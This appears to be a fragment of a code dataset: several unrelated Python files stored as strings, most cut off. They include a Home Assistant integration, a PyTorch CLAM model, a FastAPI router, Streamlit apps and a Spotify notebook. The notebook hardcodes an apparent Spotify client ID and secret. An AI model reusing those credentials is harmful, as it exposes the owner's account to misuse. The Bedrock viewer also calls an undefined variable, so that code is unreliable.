ce afi\u0219eaz\u0103 Home Assistant (form, create entry etc.)\n        \"\"\"\n        self._errors = {}\n\n        # Dac\u0103 avem user_input, \u00eenseamn\u0103 c\u0103 user-ul a completat formularul\n        if user_input is not None:\n            # Valid\u0103m datele introduse (extrem de simplu aici, doar log\u0103m)\n            username = user_input.get(CONF_USERNAME)\n            password = user_input.get(CONF_PASSWORD)\n            update_interval = user_input.get(CONF_UPDATE_INTERVAL)\n\n            _LOGGER.debug(\n                \"Utilizator a introdus: user=%s, parola=(ascuns), update_interval=%s\",\n                username,\n                update_interval,\n            )\n\n            # Exemplu de pseudo-verificare (\u00een mod real, am putea chema direct API-ul)\n            if not username or not password:\n                self._errors[\"base\"] = \"invalid_auth\"\n            else:\n                # Totul pare OK, cre\u0103m intrarea\n                return self.async_create_entry(\n                    title=f\"Hidroelectrica ({username})\",\n                    data=user_input\n                )\n\n        # Dac\u0103 nu avem user_input, sau avem erori de validare,\n        # construim schema de formular\n        return self._show_config_form(user_input)\n\n    def _show_config_form(self, user_input):\n        \"\"\"\n        Afi\u0219eaz\u0103 formularul ini\u021bial de configurare.\n\n        :param user_input: Datele reintroduse de utilizator (dac\u0103 exist\u0103 erori)\n        :return: Configura\u021bia ecranului de form\n        \"\"\"\n        if not user_input:\n            user_input = {\n                CONF_USERNAME: \"\",\n                CONF_PASSWORD: \"\",\n                CONF_UPDATE_INTERVAL: DEFAULT_UPDATE_INTERVAL\n            }\n\n        schema = vol.Schema(\n            {\n                vol.Required(CONF_USERNAME, default=user_input[CONF_USERNAME]): str,\n                vol.Required(CONF_PASSWORD, default=user_input[CONF_PASSWORD]): str,\n                vol.Required(\n                    CONF_UPDATE_INTERVAL,\n                    default=user_input[CONF_UPDATE_INTERVAL],\n                ): vol.All(\n                    vol.Coerce(int),\n                    vol.Range(min=MIN_UPDATE_INTERVAL, max=MAX_UPDATE_INTERVAL),\n                ),\n            }\n        )\n\n        return self.async_show_form(\n            step_id=\"user\",\n            data_schema=schema,\n            errors=self._errors,\n        )\n\n    @staticmethod\n    @callback\n    def async_get_options_flow(config_entry):\n        \"\"\"\n        Metod\u0103 static\u0103 ce leag\u0103 acest config flow de un flux de op\u021biuni \n        (pentru a modifica set\u0103rile ulterior).\n        \"\"\"\n        return HidroelectricaOptionsFlow(config_entry)\n\n\nclass HidroelectricaOptionsFlow(config_entries.OptionsFlow):\n    \"\"\"\n    Clasa care define\u0219te fluxul de op\u021biuni. \n    Aici, utilizatorul poate schimba update_interval dup\u0103 prima configurare.\n    \"\"\"\n\n    def __init__(self, config_entry):\n        \"\"\"\n        Constructor ce prime\u0219te config_entry, pentru a \u0219ti ce date avem deja.\n        \"\"\"\n        self.config_entry = config_entry\n        self._errors = {}\n\n    async def async_step_init(self, user_input=None):\n        \"\"\"\n        Pasul ini\u021bial pentru op\u021biuni. Ar putea exista mai mul\u021bi pa\u0219i, \n        dar aici avem doar unul simplu.\n        \"\"\"\n        self._errors = {}\n\n        if user_input is not None:\n            # Valid\u0103m datele\n            update_interval = user_input.get(CONF_UPDATE_INTERVAL)\n            _LOGGER.debug(\"Utilizator a modificat update_interval la: %s\", update_interval)\n\n            # Putem ad\u0103uga valid\u0103ri suplimentare dac\u0103 dorim\n            return self.async_create_entry(title=\"\", data=user_input)\n\n        # Prelu\u0103m datele curente din config_entry, dac\u0103 exist\u0103\n        current_interval = self.config_entry.data.get(CONF_UPDATE_INTERVAL, DEFAULT_UPDATE_INTERVAL)\n        \n        # C",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\"\"\"\nAttention Network without Gating (2 fc layers)\nargs:\n    L: input feature dimension\n    D: hidden layer dimension\n    dropout: whether to use dropout (p = 0.25)\n    n_classes: number of classes \n\"\"\"\ndef initialize_weights(module):\n    for m in module.modules():\n        if isinstance(m, nn.Linear):\n            nn.init.xavier_normal_(m.weight)\n            m.bias.data.zero_()\n        \n        elif isinstance(m, nn.BatchNorm1d):\n            nn.init.constant_(m.weight, 1)\n            nn.init.constant_(m.bias, 0)\n\nclass Attn_Net(nn.Module):\n\n    def __init__(self, L = 1024, D = 256, dropout = False, n_classes = 1):\n        super(Attn_Net, self).__init__()\n        self.module = [\n            nn.Linear(L, D),\n            nn.Tanh()]\n\n        if dropout:\n            self.module.append(nn.Dropout(0.25))\n\n        self.module.append(nn.Linear(D, n_classes))\n        \n        self.module = nn.Sequential(*self.module)\n    \n    def forward(self, x):\n        return self.module(x), x # N x n_classes\n\n\"\"\"\nAttention Network with Sigmoid Gating (3 fc layers)\nargs:\n    L: input feature dimension\n    D: hidden layer dimension\n    dropout: whether to use dropout (p = 0.25)\n    n_classes: number of classes \n\"\"\"\nclass Attn_Net_Gated(nn.Module):\n    def __init__(self, L = 1024, D = 256, dropout = False, n_classes = 1):\n        super(Attn_Net_Gated, self).__init__()\n        self.attention_a = [\n            nn.Linear(L, D),\n            nn.Tanh()]\n        \n        self.attention_b = [nn.Linear(L, D),\n                            nn.Sigmoid()]\n        if dropout:\n            self.attention_a.append(nn.Dropout(0.25))\n            self.attention_b.append(nn.Dropout(0.25))\n\n        self.attention_a = nn.Sequential(*self.attention_a)\n        self.attention_b = nn.Sequential(*self.attention_b)\n        \n        self.attention_c = nn.Linear(D, n_classes)\n\n    def forward(self, x):\n        a = self.attention_a(x)\n        b = self.attention_b(x)\n        A = a.mul(b)\n        A = self.attention_c(A)  # N x n_classes\n        return A, x\n\n\"\"\"\nargs:\n    gate: whether to use gated attention network\n    size_arg: config for network size\n    dropout: whether to use dropout\n    k_sample: number of positive/neg patches to sample for instance-level training\n    dropout: whether to use dropout (p = 0.25)\n    n_classes: number of classes \n    instance_loss_fn: loss function to supervise instance-level training\n    subtyping: whether it's a subtyping problem\n\"\"\"\nclass CLAM_SB(nn.Module):\n    def __init__(self, gate = True, size_arg = \"small\", dropout = False, k_sample=8, n_classes=2,\n        instance_loss_fn=nn.CrossEntropyLoss(), subtyping=False):\n        super(CLAM_SB, self).__init__()\n        self.size_dict = {\"small\": [1024, 256, 256], \"big\": [1024, 512, 384]}\n        size = self.size_dict[size_arg]\n        fc = [nn.Linear(size[0], size[1]), nn.ReLU()]\n        if dropout:\n            fc.append(nn.Dropout(0.25))\n        if gate:\n            attention_net = Attn_Net_Gated(L = size[1], D = size[2], dropout = dropout, n_classes = 1)\n        else:\n            attention_net = Attn_Net(L = size[1], D = size[2], dropout = dropout, n_classes = 1)\n        fc.append(attention_net)\n        self.attention_net = nn.Sequential(*fc)\n        self.classifiers = nn.Linear(size[1], n_classes)\n        instance_classifiers = [nn.Linear(size[1], 2) for i in range(n_classes)]\n        self.instance_classifiers = nn.ModuleList(instance_classifiers)\n        self.k_sample = k_sample\n        self.instance_loss_fn = instance_loss_fn\n        self.n_classes = n_classes\n        self.subtyping = subtyping\n\n        initialize_weights(self)\n\n    def relocate(self):\n        device=torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n        self.attention_net = self.attention_net.to(device)\n        self.classifiers = self.classifiers.to(device)\n        self.instance_classifiers = self.instance_classifiers.to(device)\n    \n    @staticmethod\n    def create_positive_targets(length, device):\n        return torch.full((length, ), 1, device=device).long()\n    @staticmethod\n    def create_negative_targets(length, device):\n        return torch.full((length, ), 0, device=device).long()\n    \n    #instance-level evaluation for in-the-class attention branch\n    def inst_eval(self, A, h, classifier): \n        device=h.device\n        if len(A.shape) == 1:\n            A = A.view(1, -1)\n        top_p_ids = torch.topk(A, self.k_sample)[1][-1]\n        top_p = torch.index_select(h, dim=0, index=top_p_ids)\n        top_n_ids = torch.topk(-A, self.k_sample, dim=1)[1][-1]\n        top_n = torch.index_select(h, dim=0, index=top_n_ids)\n        p_targets = self.create_positive_targets(self.k_sample, device)\n        n_targets = self.create_negative_targets(self.k_sample, device)\n\n        all_targets = torch.cat([p_targets, n_targets], dim=0)\n        all_instances = torch.cat([top_p, top_n], dim=0)\n        logits = classifier(all_instances)\n     ",
    "from fastapi import APIRouter\n\nfrom smart_fridge.core.dependencies.fastapi import DatabaseDependency, TokenDataDependency\nfrom smart_fridge.lib.db import product as products_db\nfrom smart_fridge.lib.schemas.product import ProductCreateSchema, ProductPatchSchema, ProductSchema, ProductUpdateSchema\n\n\nrouter = APIRouter(prefix=\"/products\", tags=[\"products\"])\n\n\n@router.post(\"/\", response_model=ProductSchema)\nasync def create_product(\n    db: DatabaseDependency, schema: ProductCreateSchema, token_data: TokenDataDependency\n) -> ProductSchema:\n    return await products_db.create_product(db, token_data.user_id, schema)\n\n\n@router.post(\"/open/{id}\", response_model=ProductSchema)\nasync def set_product_opened(db: DatabaseDependency, id: int, token_data: TokenDataDependency) -> ProductSchema:\n    return await products_db.set_product_opened(db, id, token_data.user_id)\n\n\n@router.post(\"/close/{id}\", response_model=ProductSchema)\nasync def set_product_closed(db: DatabaseDependency, id: int, token_data: TokenDataDependency) -> ProductSchema:\n    return await products_db.set_product_closed(db, id, token_data.user_id)\n\n\n# TODO: add filters & pagination\n@router.get(\"/\", response_model=list[ProductSchema])\nasync def get_products(db: DatabaseDependency, token_data: TokenDataDependency) -> list[ProductSchema]:\n    return await products_db.get_products(db, token_data.user_id)\n\n\n@router.get(\"/{id}\", response_model=ProductSchema)\nasync def get_product(db: DatabaseDependency, id: int, token_data: TokenDataDependency) -> ProductSchema:\n    return await products_db.get_product(db, id, token_data.user_id)\n\n\n@router.patch(\"/{id}\", response_model=ProductSchema)\nasync def patch_product(\n    db: DatabaseDependency, id: int, token_data: TokenDataDependency, schema: ProductPatchSchema\n) -> ProductSchema:\n    return await products_db.update_product(db, id, schema, token_data.user_id)\n\n\n@router.put(\"/{id}\", response_model=ProductSchema)\nasync def update_product(\n    db: DatabaseDependency, id: int, token_data: TokenDataDependency, schema: ProductUpdateSchema\n) -> ProductSchema:\n    return await products_db.update_product(db, id, schema, token_data.user_id)\n\n\n@router.delete(\"/{id}\", status_code=204)\nasync def delete_product(db: DatabaseDependency, id: int, token_data: TokenDataDependency) -> None:\n    return await products_db.delete_product(db, id, token_data.user_id)\n",
    "#!/usr/bin/env python\n# coding: utf-8\n\n# In[153]:\n\n\nimport sys\nimport re \nsys.path.append('/Users/ugeebindu/.local/lib/python3.10/site-packages')\nimport spotipy\nfrom spotipy.oauth2 import SpotifyClientCredentials\nimport pandas as pd\n\n\n# In[154]:\n\n\nclient_credentials_manager = SpotifyClientCredentials(\n    client_id='0e35f2f89cd740ea870cb37b4b1bade8', \n    client_secret='bdc00aed01fd4a748cec47f80ff86c2f'  \n)\n\n\n# In[155]:\n\n\nsp = spotipy.Spotify(client_credentials_manager=client_credentials_manager)\n\n\n# In[156]:\n\n\nplaylist_link='https://open.spotify.com/playlist/1d2fAul5T010POHxi1bQ4i'\n\n\n# In[157]:\n\n\nplaylist_URI=playlist_link.split('/')[-1]\n\n\n# In[158]:\n\n\nplaylist_URI\n\n\n# In[159]:\n\n\ndata=sp.playlist_tracks(playlist_URI)\ndata\n\n\n# In[160]:\n\n\nlen(data['items'])\n\n\n# In[161]:\n\n\ndata['items']\n\n\n# In[162]:\n\n\ndata['items'][0]\n\n\n# In[163]:\n\n\ndata['items'][0]['track']['name']\n\n\n# In[164]:\n\n\ndata['items'][0]['track']['artists']\n\n\n# In[165]:\n\n\ndata['items'][0]['track']['artists'][0]['name']\n\n\n# In[166]:\n\n\ndata['items'][0]['track']['album']['name']\n\n\n# In[167]:\n\n\ndata['items'][0]['track']['album']['release_date']\n\n\n# In[168]:\n\n\ndata['items'][0]['track']['album']['uri']\n\n\n# In[169]:\n\n\nfor row in data['items']:\n    album_id=row['track']['album']['id']\n    album_name=row['track']['album']['name']\n    album_artists=\", \".join([artist['name'] for artist in row['track']['artists']]) \n    album_released_date=row['track']['album']['release_date']\n    album_uri=row['track']['uri']\n    album_popularity=row['track']['popularity']\n    album_total_tracks=row['track']['album']['total_tracks']\n    album_url=row['track']['album']['external_urls']['spotify']\n    print(album_name)\n    \n\n\n# In[170]:\n\n\nfor row in data['items']:\n    album_id=row['track']['album']['id']\n    album_name=row['track']['album']['name']\n    album_artists=\", \".join([artist['name'] for artist in row['track']['artists']]) \n    album_released_date=row['track']['album']['release_date']\n    album_uri=row['track']['uri']\n    album_popularity=row['track']['popularity']\n    album_total_tracks=row['track']['album']['total_tracks']\n    album_url=row['track']['album']['external_urls']['spotify']\n    \n    album_element={'album_id':album_id,\n                   'name':album_name,\n                   'artists':album_artists,\n                   'released_date':album_released_date,\n                   'uri':album_uri,\n                   'popularity':album_popularity,\n                   'total_tracks':album_total_tracks,\n                   'url':album_url}\n    print(album_element)\n\n\n# In[171]:\n\n\nalbum_list=[]\nfor row in data['items']:\n    album_id=row['track']['album']['id']\n    album_name=row['track']['album']['name']\n    album_artists=\", \".join([artist['name'] for artist in row['track']['artists']]) \n    album_released_date=row['track']['album']['release_date']\n    album_total_tracks=row['track']['album']['total_tracks']\n    album_url=row['track']['album']['external_urls']['spotify']\n    \n    album_element={'album_id':album_id,\n                   'name':album_name,\n                   'artists':album_artists,\n                   'released_date':album_released_date,\n                   'total_tracks':album_total_tracks,\n                   'url':album_url}\n    album_list.append(album_element)\n    \n\n\n# In[172]:\n\n\nalbum_list\n\n\n# In[173]:\n\n\ndata['items'][0]\n\n\n# In[174]:\n\n\ndata['items'][0]['track']['artists']  #artists has a dictionary inside track\n\n\n# In[175]:\n\n\ndata['items'][2]['track']['artists']\n\n\n# In[176]:\n\n\ndata['items'][2]\n\n\n# In[177]:\n\n\n#other way of seperating:\nartist_list=[]\nfor row in data['items']:\n    for key,value in row.items():\n        if key=='track':\n            for artist in value['artists']:\n                artist_dict={'artist_id':artist['id'],\n                             'artist_name':artist['name'],\n                             'external_url':artist['href']}\n                artist_list.append(artist_dict)\n\n\n# In[178]:\n\n\nartist_list\n\n\n# In[179]:\n\n\ntrack_list=[]\nfor row in data['items']:\n    for key,value in row.items():\n        if key=='track':\n                tracks_dict={'track_id':value['id'],\n                              'track_name':value['name'],\n                               'track_popularity':value['popularity'],\n                               'track_uri':value['uri'],\n                               'track_duration':value['duration_ms'],\n                               'track_url':value['external_urls']}\n                track_list.append(tracks_dict)\n    \n\n\n# In[180]:\n\n\ntrack_list\n\n\n# In[181]:\n\n\nalbum_df=pd.DataFrame.from_dict(album_list)\n\n\n# In[182]:\n\n\nalbum_df.head()\n\n\n# In[183]:\n\n\ntrack_df=pd.DataFrame.from_dict(track_list)\n\n\n# In[184]:\n\n\ntrack_df.head()\n\n\n# In[185]:\n\n\nartist_df=pd.DataFrame.from_dict(artist_list)\n\n\n# In[186]:\n\n\nartist_df\n\n\n# In[187]:\n\n\nalbum_df.info()\n\n\n# In[190]:\n\n\nalbum_df['release_date']=pd.to_datetime(album_df['released_date'])\n\n\n# In[191]:\n\n\nalbum_df.info()\n\n\n# In[192]:\n\n\nalbum_df=album_df.drop_duplicates(subset=['album_id'])\n\n\n# In[193",
    "import os\nimport streamlit as st\nfrom smolagents import tool, CodeAgent, HfApiModel\nimport pdfplumber\nfrom uuid import uuid4\n\n\ndef parse_pdf(file_path: str) -> str:\n    \"\"\"\n    Extracts text from a PDF file.\n\n    Args:\n        file_path: Path to the PDF file.\n        \n    Returns:\n        Extracted text from the PDF.\n    \"\"\"\n    try:\n        with pdfplumber.open(file_path) as pdf:\n            text = \"\"\n            for page in pdf.pages:\n                text += page.extract_text()\n        return text\n    except Exception as e:\n        return f\"Error parsing PDF: {str(e)}\"\n\n\"\"\"\nNot really a tool tho\n\"\"\"\n@tool\ndef get_text() -> str:\n    \"\"\"\n    Returns:\n        Extracted text from the PDF.\n    \"\"\"\n    return st.session_state.get(\"pdf_text\", \"\")\n\n\nif \"reasoning_in_progress\" not in st.session_state:\n    st.session_state.reasoning_in_progress = False\nif \"pdf_text\" not in st.session_state:\n    st.session_state.pdf_text = \"\"\n\n\nst.title(\"Interactive PDF Query Tool\")\n\n\ninput_mode = st.radio(\n    \"Choose your input mode:\", \n    [\"Upload a PDF\", \"Write Text Directly\"], \n    disabled=st.session_state.reasoning_in_progress\n)\n\nif input_mode == \"Upload a PDF\":\n    uploaded_file = st.file_uploader(\n        \"Upload a PDF file\", \n        type=\"pdf\", \n        disabled=st.session_state.reasoning_in_progress\n    )\n\n    if uploaded_file:\n        uploads_dir = \"./uploads\"\n        os.makedirs(uploads_dir, exist_ok=True)\n        unique_filename = f\"{uuid4()}_{uploaded_file.name}\"\n        file_path = os.path.join(uploads_dir, unique_filename)\n\n        with open(file_path, \"wb\") as f:\n            f.write(uploaded_file.read())\n\n        st.session_state.pdf_text = parse_pdf(file_path)\n\n        os.remove(file_path)\n\n        st.subheader(\"Extracted Text from PDF\")\n        st.text_area(\"PDF Content\", st.session_state.pdf_text, height=300, disabled=True)\nelif input_mode == \"Write Text Directly\":\n    st.session_state.pdf_text = st.text_area(\n        \"Write or Paste Your Text Here\", \n        height=300, \n        disabled=st.session_state.reasoning_in_progress\n    )\n\nst.subheader(\"Ask a Question\")\nquestion = st.text_input(\n    \"Enter your question:\", \n    disabled=st.session_state.reasoning_in_progress\n)\n\nmax_iterations = st.number_input(\n    \"Select the number of reasoning steps (max_iterations):\",\n    min_value=1,\n    max_value=10,\n    value=3,\n    disabled=st.session_state.reasoning_in_progress\n)\n\nif st.button(\"Get Answer\", disabled=st.session_state.reasoning_in_progress):\n    if not question.strip():\n        st.error(\"Please enter a valid question.\")\n    elif not st.session_state.pdf_text.strip():\n        st.error(\"Please provide text content (via PDF or direct input).\")\n    else:\n        st.session_state.reasoning_in_progress = True  \n        with st.spinner(\"Reasoning in progress...\"):\n            agent = CodeAgent(\n                tools=[get_text],\n                model=HfApiModel(),\n                max_iterations=max_iterations,\n            )\n            answer = agent.run(question)\n\n        st.session_state.reasoning_in_progress = False \n        st.success(f\"Answer: {answer}\")\n",
    "import sys\nimport traceback\nfrom src.meme_selector import MemeSelector\nfrom src.status_window import StatusWindow\nimport threading\nimport keyboard\n\ndef main():\n    try:\n        # \u521b\u5efa\u9009\u62e9\u5668\n        selector = MemeSelector()\n        \n        # \u521b\u5efa\u72b6\u6001\u7a97\u53e3\n        status_window = StatusWindow()\n        \n        # \u8bbe\u7f6e\u72b6\u6001\u7a97\u53e3\u7684\u56de\u8c03\n        def on_switch_change(state):\n            selector.set_running_state(state)\n        status_window.set_callback(on_switch_change)\n        \n        # \u521b\u5efa\u4e3b\u7a97\u53e3\n        selector.root = status_window.root\n        \n        # \u542f\u52a8\u68c0\u67e5\u5f39\u7a97\u961f\u5217\u7684\u5b9a\u65f6\u5668\n        selector.root.after(100, selector.check_popup_queue)\n        \n        # \u542f\u52a8\u952e\u76d8\u76d1\u542c\u7ebf\u7a0b\n        keyboard_thread = threading.Thread(\n            target=lambda: keyboard.on_press(selector.on_key),\n            daemon=True\n        )\n        keyboard_thread.start()\n        \n        # \u8fd0\u884c\u4e3b\u5faa\u73af\uff08\u5728\u4e3b\u7ebf\u7a0b\u4e2d\uff09\n        status_window.run()\n        \n    except Exception as e:\n        print(f\"\u53d1\u751f\u9519\u8bef: {e}\")\n        traceback.print_exc()\n        try:\n            input(\"\u6309\u56de\u8f66\u952e\u9000\u51fa...\")\n        except:\n            pass\n        finally:\n            sys.exit(1)\n\nif __name__ == \"__main__\":\n    main() ",
    "import logging \nimport sys\nimport os\nimport time\nimport string\nimport threading\nimport pprint\nfrom dotenv import load_dotenv\n\nif __name__ == \"__main__\":\n    from gradient_ascent_parse import CustomParse\nelse:\n    from .gradient_ascent_parse import CustomParse\n\nimport pathway as pw\nfrom pathway.xpacks.llm.vector_store import VectorStoreClient, VectorStoreServer\nfrom pathway.xpacks.llm.splitters import TokenCountSplitter\nfrom pathway.xpacks.llm import embedders\n\nlogging.basicConfig(level=logging.INFO, \n                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', \n                    filename='kdsh-2025.log')\nlogging.captureWarnings(True)\nload_dotenv()\n\nclass DataIndex:\n    def __init__(self, data_sources, embedder, splitter,**credentials):\n        self.embedder = embedder\n        self.splitter = splitter\n        self.data_sources = data_sources\n        self.credentials = credentials\n        self.parser = CustomParse()\n\n        self.server = VectorStoreServer(*data_sources,\n                                          embedder=self.embedder,\n                                          splitter=self.splitter,\n                                          parser=self.parser\n                                        )\n        self.client = VectorStoreClient(host=\"127.0.0.1\",\n                                        port=int(os.getenv(\"PATHWAY_PORT\"))\n                                        )\n        \n    def run(self):\n            self.server.run_server(host=\"127.0.0.1\", \n                                   port=int(os.getenv(\"PATHWAY_PORT\")), \n                                   threaded=True,\n                                   with_cache=False)\n\n    def query(self, query, k=3):\n        return self.client.query(query, k=k)\n\n\n\nclass FileRetriever:\n    def __init__(self, object_id, credentials_file=\"credentials.json\", embedder_model=\"intfloat/e5-large-v2\"):\n        load_dotenv()\n        self.embedder = embedders.SentenceTransformerEmbedder(model=embedder_model)\n        self.splitter = TokenCountSplitter()\n        self.data_sources = [\n            pw.io.gdrive.read(object_id=object_id, service_user_credentials_file=credentials_file)\n        ]\n        self.index = DataIndex(\n            data_sources=self.data_sources,\n            embedder=self.embedder,\n            splitter=self.splitter\n        )\n\n    def start_server(self):\n        self.index.run()\n\n    def retrieve_data(self, query, k, timeout=20):\n        \"\"\"\n        Returns data using the same streaming principle from DataIndex.\n        \"\"\"\n        # Wait to ensure server is ready\n        time.sleep(timeout)\n        # Query data\n        return self.index.query(query, k=k)\n    \n# Usage\nif __name__ == \"__main__\":\n    object_id = \"1T0Dudr2h8M_IM8OHJ1EZEuRBzIlNn6ON\"\n\n    def run_retriever():\n        retriever = FileRetriever(object_id=object_id)\n        query = \"What are the key contributions of the proposed deep learning architecture?\"\n        retriever.start_server()\n        response = retriever.retrieve_data(query, k=3)\n        pprint.pprint(response)\n\n    thread = threading.Thread(target=run_retriever)\n    thread.start()\n    print(\"Hello world\")\n    thread.join()\n\n\n    \n\n",
    "import json\nfrom datetime import datetime, timedelta, timezone\n\nimport streamlit as st\nfrom streamlit_extras.tags import tagger_component\n\n##########\n# \u5b9a\u6570\u5b9a\u7fa9\n##########\n\n# AWS Bedrock\u306e\u547c\u3073\u51fa\u3057\u30ed\u30b0\u3092\u51fa\u529b\u3057\u3066\u3044\u308bCloudWatch\u30ed\u30b0\u30b0\u30eb\u30fc\u30d7\u540d\u3068\u30ea\u30fc\u30b8\u30e7\u30f3\ndefault_log_group_name = \"bedrock-invoke-logging-us-east-1\"\ndefault_region_name = \"us-east-1\"\n\n##########\n\n\ndef split_event(message: str):\n    \"\"\"\n    CloudWatch\u306e\u30ed\u30b0\u30a4\u30d9\u30f3\u30c8\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u89e3\u6790\u3057\u3001\u5165\u529b\u3001\u51fa\u529b\u3001\u30e1\u30bf\u30c7\u30fc\u30bf\u306b\u5206\u5272\u3059\u308b\n\n    Args:\n        message (str): JSON\u5f62\u5f0f\u306e\u30ed\u30b0\u30e1\u30c3\u30bb\u30fc\u30b8\n\n    Returns:\n        tuple: (\u5165\u529bJSON, \u5165\u529bS3\u30d1\u30b9, \u51fa\u529bJSON, \u30e1\u30bf\u30c7\u30fc\u30bf\u8f9e\u66f8, \u30a8\u30e9\u30fc\u30b3\u30fc\u30c9)\n    \"\"\"\n\n    input_body_json = None\n    input_body_s3_path = None\n    output_body_json = None\n    metadata = {}\n    errorCode = None\n\n    event = json.loads(message)\n\n    if \"input\" in event:\n        if \"inputBodyJson\" in event[\"input\"]:\n            input_body_json = event[\"input\"][\"inputBodyJson\"]\n        elif \"inputBodyS3Path\" in event[\"input\"]:\n            input_body_s3_path = event[\"input\"][\"inputBodyS3Path\"]\n\n    if \"output\" in event:\n        if \"outputBodyJson\" in event[\"output\"]:\n            output_body_json = event[\"output\"][\"outputBodyJson\"]\n\n    # \u30e1\u30bf\u30c7\u30fc\u30bf\u3092\u62bd\u51fa\n    metadata[\"timestamp\"] = event[\"timestamp\"]\n    metadata[\"modelId\"] = event[\"modelId\"]\n    metadata[\"operation\"] = event[\"operation\"]\n\n    if output_body_json:\n        metadata[\"stopReason\"] = output_body_json[\"stopReason\"]\n        metadata[\"usage\"] = output_body_json[\"usage\"]\n        metadata[\"latencyMs\"] = output_body_json[\"metrics\"][\"latencyMs\"]\n    else:\n        # \u5024\u304c\u306a\u3044\u3068\u56f0\u308b\u306e\u3067\u3001\u3054\u307e\u304b\u3059\n        metadata[\"usage\"] = {\"inputTokens\": 0, \"outputTokens\": 0, \"totalTokens\": 0}\n        metadata[\"latencyMs\"] = 0\n\n    if input_body_json:\n        if \"inferenceConfig\" in input_body_json:\n            metadata[\"inferenceConfig\"] = input_body_json[\"inferenceConfig\"]\n\n        if \"additionalModelRequestFields\" in input_body_json:\n            metadata[\"additionalModelRequestFields\"] = input_body_json[\n                \"additionalModelRequestFields\"\n            ]\n\n    if \"errorCode\" in event:\n        errorCode = event[\"errorCode\"]\n\n    return input_body_json, input_body_s3_path, output_body_json, metadata, errorCode\n\n\ndef write_tag(metadata: dict, errorCode: str = None):\n    \"\"\"\n    \u30bf\u30b0\u3092\u8868\u793a\n\n    Args:\n        metadata (dict): \u30e1\u30bf\u30c7\u30fc\u30bf\u3092\u542b\u3080\u8f9e\u66f8\n    \"\"\"\n\n    tags = [\n        f\"\ud83e\udd16 {metadata['modelId']}\",\n        f\"\u231b\ufe0f {metadata['latencyMs']/1000} s\",\n        f\"\u270f\ufe0f {metadata['usage']['totalTokens']}\",\n        f\"\u270f\ufe0f {metadata['operation']}\",\n    ]\n    color_name = [\n        \"BLUE\",\n        \"GREEN\",\n        \"ORANGE\",\n        \"GRAY\",\n    ]\n\n    if errorCode:\n        tags.append(\"\u203c\ufe0f ERROR\")\n        color_name.append(\"RED\")\n\n    tagger_component(\"\", tags, color_name)\n\n\ndef write_system(body: dict):\n    \"\"\"\n    \u30b7\u30b9\u30c6\u30e0\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u5c55\u958b\u53ef\u80fd\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3068\u3057\u3066\u8868\u793a\n\n    Args:\n        body (dict): \u30b7\u30b9\u30c6\u30e0\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u542b\u3080\u8f9e\u66f8\n    \"\"\"\n    if \"system\" in body:\n        system = input_body_json[\"system\"]\n        if len(system) == 0:\n            return\n        if \"text\" in system[0]:\n            text = system[0][\"text\"]\n            with st.expander(\"**SYSTEM**\", expanded=False):\n                st.write(text)\n\n\ndef write_input_message(body: dict):\n    \"\"\"\n    \u5165\u529b\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u5c55\u958b\u53ef\u80fd\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3068\u3057\u3066\u8868\u793a\n\n    Args:\n        body (dict): \u5165\u529b\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u542b\u3080\u8f9e\u66f8\n    \"\"\"\n    messages = body[\"messages\"]\n\n    for message in messages:\n        role = message[\"role\"]\n        content = message[\"content\"]\n        for c in content:\n            if \"text\" in c:\n                with st.expander(f\"**{role.upper()}**\", expanded=True):\n                    st.text(c[\"text\"])\n\n\ndef write_output_message(body: dict):\n    \"\"\"\n    \u51fa\u529b\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u5c55\u958b\u53ef\u80fd\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3068\u3057\u3066\u8868\u793a\n\n    Args:\n        body (dict): \u51fa\u529b\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u542b\u3080\u8f9e\u66f8\n    \"\"\"\n    output = body[\"output\"]\n    message = output[\"message\"]\n    role = message[\"role\"]\n    content = message[\"content\"]\n    for c in content:\n        if \"text\" in c:\n            with st.expander(f\"**{role.upper()}**\", expanded=True):\n                st.text(c[\"text\"])\n\n\n# \u30da\u30fc\u30b8\u8a2d\u5b9a\nst.set_page_config(layout=\"wide\")\nst.title(\"BedrockSmith\")\n\n# \u30ed\u30b0\u53d6\u5f97\u671f\u9593\u306e\u9078\u629e\u80a2\u3092\u5b9a\u7fa9\ntime_range = {\n    \"1\u6642\u9593\": 1,\n    \"6\u6642\u9593\": 6,\n    \"12\u6642\u9593\": 12,\n    \"24\u6642\u9593\": 24,\n    \"48\u6642\u9593\": 48,\n    \"96\u6642\u9593\": 96,\n}\n\n## \u30b5\u30a4\u30c9\u30d0\u30fc\u306e\u8a2d\u5b9a\u9805\u76ee\nwith st.sidebar:\n    with st.expander(\"\u8a2d\u5b9a\", expanded=True):\n        # \u30ed\u30b0\u53d6\u5f97\u306e\u30d1\u30e9\u30e1\u30fc\u30bf\u8a2d\u5b9a\n        log_group_name = st.text_input(\"\u30ed\u30b0\u30b0\u30eb\u30fc\u30d7\u540d\", value=default_log_group_name)\n        region_name = st.text_input(\"\u30ea\u30fc\u30b8\u30e7\u30f3\u540d\", value=default_region_name)\n        select_range = st.selectbox(\"\u53d6\u5f97\u671f\u9593\", time_range.keys(), index=3)\n        limit = st.slider(\"\u53d6\u5f97\u4ef6\u6570\", min_value=1, max_value=1000, value=100, step=10)\n    submit = st.button(\"\u30ed\u30b0\u53d6\u5f97\")\n\n## \u30ed\u30b0\u53d6\u5f97\u306e\u5b9f\u884c\nif submit:\n    # \u8868\u793a\u5bfe\u8c61\u304c\u3042\u308c\u3070\u4e00\u65e6\u524a\u9664\n    if \"event\" in st.session_state:\n        del st.session_state[\"event\"]\n\n    # \u6642\u9593\u7bc4\u56f2\u306e\u8a08\u7b97\n    now = datetime.now(timezone.utc)\n    start_time = now - timedelta(hours=time_range[select_range])\n    start_time_ms = int(start_time.timestamp() * 1000)\n\n    # AWS CloudWatch Logs\u304b\u3089\u30ed\u30b0\u3092\u53d6\u5f97\n    import boto3\n\n    client_logs = boto3.client(\"logs\", 